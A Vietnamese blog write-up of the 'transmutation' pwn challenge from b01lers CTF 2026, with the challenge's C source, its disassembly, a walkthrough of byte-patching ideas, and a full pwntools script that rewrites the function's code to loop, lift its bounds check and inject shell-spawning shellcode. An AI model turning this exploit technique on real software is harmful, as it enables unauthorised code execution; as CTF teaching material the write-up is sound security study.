---
title: "WRITE UP b01lers CTF 2026"
date: 2026-04-18
lastmod: 2026-04-19
description: "Writes up b01lers CTF 2026 - PWN"
draft: false
author: "Author Name"
tags: ["CTF", "Pwn", "Binary Exploitation", "b01lers CTF"]
categories: ["Writeups"]
cover: 'https://ctftime.org/media/events/b01lers-griffen_2.png'
stage: 'evergreen'
colophon: true 
type: "post"
image: "/images/avatar.jpg"
---
<style>
  /* 1. THU NHỎ AVATAR XUỐNG MỨC TINH TẾ (50px) */
  /* Nhắm chính xác vào thẻ img của avatar để không bắt nhầm ảnh bài viết */
  header img, 
  [class*="author"] img, 
  img[alt*="niddalA"] {
    width: 50px !important;    /* Chỉnh số này nếu muốn to/nhỏ hơn tí nữa */
    height: 50px !important;
    max-width: 50px !important;
    border-radius: 50% !important;
    object-fit: cover !important;
    display: inline-block !important;
    vertical-align: middle !important; /* Căn giữa với dòng chữ tên bạn */
    margin-right: 10px !important;   /* Tạo khoảng cách với tên "niddalA" */
  }

  /* 2. ĐẢM BẢO CHỮ VẪN TRÀN LỀ ĐẸP */
  article p, article li {
    text-indent: 0 !important;
    max-width: 100% !important;
    width: 100% !important;
    text-align: left !important;
    margin-bottom: 1.2em !important; /* Giãn dòng giữa các đoạn văn cho dễ đọc */
  }

  /* 3. ẢNH TRONG BÀI VIẾT VẪN TO RÕ RÀNG */
  .post-content img, section img {
    width: 100% !important;
    height: auto !important;
    display: block;
    margin: 25px 0 !important;
  }
</style>
# WRITE UP b01lers CTF 2026
## 1. pwn\transmutation
![alt text](/post/write-up-b01lers-ctf-2026/anh-bai-1.png)
Sau khi giải nén file ta được:
![alt text](/post/write-up-b01lers-ctf-2026/image-1.png)
![alt text](/post/write-up-b01lers-ctf-2026/image-2.png)
### Phân tích
`cat chall.c` ta đọc file chương trình c:
```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>

#define MAIN ((char *)main)
#define CHALL ((char *)chall)
#define LEN (MAIN - CHALL)

int main(void);

void chall(void) {
    char c = getchar();
    unsigned char i = getchar();
    if (i < LEN) {
        CHALL[i] = c;
    }
}
/* logic của hàm này là nhập vào một byte(c) sao đó nhập index(i) thì gán địa chỉ đầu hàm chall + index đó bằng mã mà ta ghi vào, 
nó kiểm tra nếu vượt quá hàm chain thì không ghi nên ta chỉ được thay đổi mã trong phạm vi hàm chall thôi*/
int main(void) {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    mprotect((char *)((long)CHALL & ~0xfff), 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC); //gọi mprotect để thay đổi quyền thành 7

    chall();
    return 0;
}
```
### Ý tưởng Exploit
chạy `objdump -d chall -M intel`:
```bash
0000000000401146 <chall>:
  401146:       55                      push   rbp
  401147:       48 89 e5                mov    rbp,rsp
  40114a:       48 83 ec 10             sub    rsp,0x10
  40114e:       e8 ed fe ff ff          call   401040 <getchar@plt>
  401153:       88 45 ff                mov    BYTE PTR [rbp-0x1],al
  401156:       e8 e5 fe ff ff          call   401040 <getchar@plt>
  40115b:       88 45 fe                mov    BYTE PTR [rbp-0x2],al
  40115e:       0f b6 55 fe             movzx  edx,BYTE PTR [rbp-0x2]
  401162:       48 8d 05 26 00 00 00    lea    rax,[rip+0x26]        # 40118f <main>
  401169:       48 8d 0d d6 ff ff ff    lea    rcx,[rip+0xffffffffffffffd6]        # 401146 <chall>
  401170:       48 29 c8                sub    rax,rcx
  401173:       48 39 c2                cmp    rdx,rax
  401176:       7d 14                   jge    40118c <chall+0x46>
  401178:       0f b6 45 fe             movzx  eax,BYTE PTR [rbp-0x2]
  40117c:       48 8d 15 c3 ff ff ff    lea    rdx,[rip+0xffffffffffffffc3]        # 401146 <chall>
  401183:       48 01 c2                add    rdx,rax
  401186:       0f b6 45 ff             movzx  eax,BYTE PTR [rbp-0x1]
  40118a:       88 02                   mov    BYTE PTR [rdx],al
  40118c:       90                      nop
  40118d:       c9                      leave
  40118e:       c3                      ret

000000000040118f <main>:
  40118f:       55                      push   rbp
  401190:       48 89 e5                mov    rbp,rsp
  401193:       48 8b 05 b6 2e 00 00    mov    rax,QWORD PTR [rip+0x2eb6]        # 404050 <stdin@GLIBC_2.2.5>
  40119a:       be 00 00 00 00          mov    esi,0x0
  40119f:       48 89 c7                mov    rdi,rax
  4011a2:       e8 89 fe ff ff          call   401030 <setbuf@plt>
  4011a7:       48 8b 05 92 2e 00 00    mov    rax,QWORD PTR [rip+0x2e92]        # 404040 <stdout@GLIBC_2.2.5>
  4011ae:       be 00 00 00 00          mov    esi,0x0
  4011b3:       48 89 c7                mov    rdi,rax
  4011b6:       e8 75 fe ff ff          call   401030 <setbuf@plt>
  4011bb:       48 8b 05 9e 2e 00 00    mov    rax,QWORD PTR [rip+0x2e9e]        # 404060 <stderr@GLIBC_2.2.5>
  4011c2:       be 00 00 00 00          mov    esi,0x0
  4011c7:       48 89 c7                mov    rdi,rax
  4011ca:       e8 61 fe ff ff          call   401030 <setbuf@plt>
  4011cf:       48 8d 05 70 ff ff ff    lea    rax,[rip+0xffffffffffffff70]        # 401146 <chall>
  4011d6:       48 25 00 f0 ff ff       and    rax,0xfffffffffffff000
  4011dc:       ba 07 00 00 00          mov    edx,0x7
  4011e1:       be 00 10 00 00          mov    esi,0x1000
  4011e6:       48 89 c7                mov    rdi,rax
  4011e9:       e8 62 fe ff ff          call   401050 <mprotect@plt>
  4011ee:       e8 53 ff ff ff          call   401146 <chall>
  4011f3:       b8 00 00 00 00          mov    eax,0x0
  4011f8:       5d                      pop    rbp
  4011f9:       c3                      ret
```
Ý tưởng là tạo ra vòng lặp vô hạn vì chương trình chỉ cho phép một lần nhập ta phải lặp để có thể nạp `shellcode`
Vì ta có thể sửa index nào trong hàm chall
Ở đây tôi đã thử 3 trưởng hợp:
1. Đổi `401176:       7d 14                   jge    40118c <chall+0x46>` 
Cơ chế của dòng lệnh này là thực thi lệnh nhảy với điều kiện `<=` và nhảy xuống địa chỉ cách địa chỉ này `0x14`
=> Nhảy đến đây: `40118c:       90                      nop`
ta thấy 7d là lệnh jge còn 14 là tham số ta muốn nhảy
Để thay đổi được 14 ta tính `Index = 0x401177 - 0x401146 = 0x31` tương đương với Index 49 
Thay vì để chương trình nhảy tới địa chỉ `0x40118c` khi điều kiện thỏa mãn thì ta muốn nó nhảy đến địa chỉ đầu hàm chall để có thể tạo ra vòng lặp thay vì để nó kết thúc như vừa rồi
Nhưng tôi nhận ra một vấn đề là nó sẽ nhảy qua luôn đoạn ghi đè index nên cách này không dùng được
2. Đổi `40118c:       90                      nop` ở đây ta có thể thay `0x90` thành `0xEB` tức mã của lệnh jmp thì lúc này sẽ thiếu tham số nên nó sẽ lấy luôn tham số là lệnh kế tiếp làm tham số ở đây là `40118d:       c9                      leave` tức sẽ giúp chúng ta đi ngược lên trên `0xc9` tức là 55 bytes `0x40118c + 0xc9 = 0x401255`
Từ: `0x00 -> 0x7F` là số dương `0x80 -> 0xFF` là số âm do đó `0xc9` là số âm nên nhảy ngược lên trên
Tức là chúng ta có thể ngay trước hàm `getchar()` lần 2 => vòng lặp vô hạn nhưng lúc này ta chỉ có thể thay đổi index và không thay đổi được nội dung nên cách này cũng không dùng được
3. Đổi `40118e:       c3                      ret` Thay vì để nó quay lại hàm main và thực hiện `4011f3:       b8 00 00 00 00          mov    eax,0x0` thì ta có thể thay ret = nop lúc này nó sẽ thực hiện lệnh tiếp theo là: `40118f:       55                      push   rbp` quay về đầu hàm main từ đây ta đã có thể lặp vô hạn
Tính toán `index = 0x40118e - 0x401146 = 0x48 = 72 (bytes)`
Mã máy của nop: `0x90`
Lúc này ta đã tạo ra được vòng lặp vô hạn để chèn shellcode
Tiếp theo vì 72 bytes giới hạn là quả nhỏ không thể thực thi được shellcode, viết thêm sẽ vi phạm vào điều kiện, nên ta sẽ tìm cách tăng biến LEN để có thể có nhiều không gian hơn, tiếp theo là viết shellcode ở `4011f3:       b8 00 00 00 00          mov    eax,0x0` nếu ta viết luôn vào dưới hàm `chall()` thì lệnh nop lúc này sẽ lỗi và không thực thi được chương trình.
```c
#define LEN (MAIN - CHALL) //=72bytes
...
void chall(void) {
    char c = getchar();
    unsigned char i = getchar();
    if (i < LEN) {
        CHALL[i] = c;
    }
}
```
ta giờ đây vì có vòng lặp vô hạn nên có thể sửa điều kiện trên ở đây tôi tăng biến LEN lên ta thấy: `401170:       48 29 c8                sub    rax,rcx` đây là biến LEN cũng như là điều kiện của chúng ta => kiểm soát được thanh ghi rax là ta có thể đẩy giá trị LEN lên nhiều lần nhìn lại objdump ta thấy:
`401162:       48 8d 05 26 00 00 00    lea    rax,[rip+0x26]` ta có thể đổi  `0x26` bằng cách tận dụng chương trình cho đổi 1 byte `48 8d 05 là lea    rax,[rip+...] từ đây ta sửa 26 thành số ta muốn ` ở đây tôi sửa thành `0xff = 255 (bytes)`
Tiếp theo khi giới hạn đã rộng mở ta có thể chèn shellcode một cách thoải mái
Chú ý khi đã hoàn thành payload giờ đây ta phải ghi lại `nop` ở cuối hàm chall thành `ret` để nó có thể chạy xuống hàm main và thực thi shellcode của chúng ta
### PAYLOAD
```python
from pwn import *

context.arch = 'amd64'
p = process('./chall')

IDX_RET = 72            
IDX_CMP_LEN = 31        
IDX_SHELLCODE_START = 173 #Index của lệnh ngay sau 'call chall' trong hàm main

shellcode = asm(shellcraft.sh())

def send_payload(byte_val, index_val):
    """Hàm phụ trợ để gửi 1 byte dữ liệu và 1 byte index"""
    p.send(p8(byte_val))   # Gửi Data
    p.send(p8(index_val))  # Gửi Index

# LƯỢT 1: Tạo vòng lặp bằng cách Fall-through
# Sửa 'ret' (0xc3) thành 'nop' (0x90)
log.info(f"Bypass RET: Ghi 0x90 vào Index {IDX_RET}")
send_payload(0x90, IDX_RET)

# LƯỢT 2: Phá vỡ giới hạn ghi đè (Jailbreak)
# Sửa giới hạn trong lệnh 'cmp' thành 255 (0xff)
log.info(f"Jailbreak: Ghi 0xff vào Index {IDX_CMP_LEN}")
send_payload(0xff, IDX_CMP_LEN)

# LƯỢT 3 đến N: Viết Shellcode vào đuôi hàm main
log.info("Bắt đầu nạp Shellcode...")
current_idx = IDX_SHELLCODE_START

for i, byte in enumerate(shellcode):
    send_payload(byte, current_idx)
    current_idx += 1

send_payload(0xc3, IDX_RET)
p.interactive()

```
